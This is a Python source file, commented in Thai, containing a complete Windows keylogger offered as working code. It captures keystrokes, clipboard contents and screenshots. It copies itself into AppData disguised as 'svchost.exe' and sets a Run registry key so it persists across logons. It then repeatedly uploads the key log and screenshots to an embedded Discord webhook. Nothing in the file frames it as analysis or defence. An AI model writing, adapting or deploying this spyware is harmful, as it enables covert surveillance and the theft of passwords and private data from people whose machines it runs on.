import os
import sys
import shutil
import time
import pyperclip
import requests
from PIL import ImageGrab
from pynput import keyboard
import winreg  # สำหรับเพิ่ม autorun

# ⚠️ ใส่ Webhook URL ของคุณตรงนี้
WEBHOOK_URL = "https://discord.com/api/webhooks/1368140434504941608/8B9F6WLh4Vc3hZ0IhkpiPOvPgut9WQAe7w9_GvFEy3CriXr0B_NBxR1IbWD8p0BI98ws"

# Log paths
KEYLOG_PATH = "keylog.txt"
SCREENSHOT_PATH = "screenshot.png"

# บันทึกข้อความลงไฟล์
def write_log(data):
    with open(KEYLOG_PATH, "a", encoding="utf-8") as f:
        f.write(data + "\n")

# ดัก key
def on_press(key):
    try:
        write_log(f"{key.char}")
    except AttributeError:
        write_log(f"[{key}]")

# ดึง clipboard
def get_clipboard():
    try:
        clip = pyperclip.paste()
        write_log(f"[CLIPBOARD] {clip}")
    except:
        pass

# ถ่ายภาพหน้าจอ
def take_screenshot():
    img = ImageGrab.grab()
    img.save(SCREENSHOT_PATH)

# ส่งไฟล์ไปยัง Discord
def send_to_discord():
    try:
        with open(KEYLOG_PATH, 'rb') as f1, open(SCREENSHOT_PATH, 'rb') as f2:
            files = {
                'file1': (KEYLOG_PATH, f1),
                'file2': (SCREENSHOT_PATH, f2)
            }
            requests.post(WEBHOOK_URL, files=files)
        write_log("[✓] Sent to Discord.")
    except Exception as e:
        write_log(f"[Error sending] {e}")

# เพิ่มโปรแกรมเข้า startup registry
def add_to_startup(name, exe_path):
    try:
        reg_key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(reg_key, name, 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(reg_key)
        write_log("[✓] Added to startup as '{name}'")
    except Exception as e:
        write_log(f"[Error adding to startup] {e}")

# ทำการติดตั้ง (คัดลอกไป AppData)
def install():
    exe_path = os.path.abspath(sys.argv[0])
    target_path = os.path.join(os.getenv('APPDATA'), 'svchost.exe')  # ใช้ชื่อแกล้งเป็น svchost
    if not os.path.exists(target_path):
        shutil.copyfile(exe_path, target_path)
        write_log("[✓] Copied to AppData")

    add_to_startup("svchost", target_path)

# Main keylogger
def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    while True:
        get_clipboard()
        time.sleep(30)
        take_screenshot()
        send_to_discord()
        time.sleep(60)

if __name__ == "__main__":
    install()  # ติดตั้งและเพิ่ม autorun
    start_keylogger()
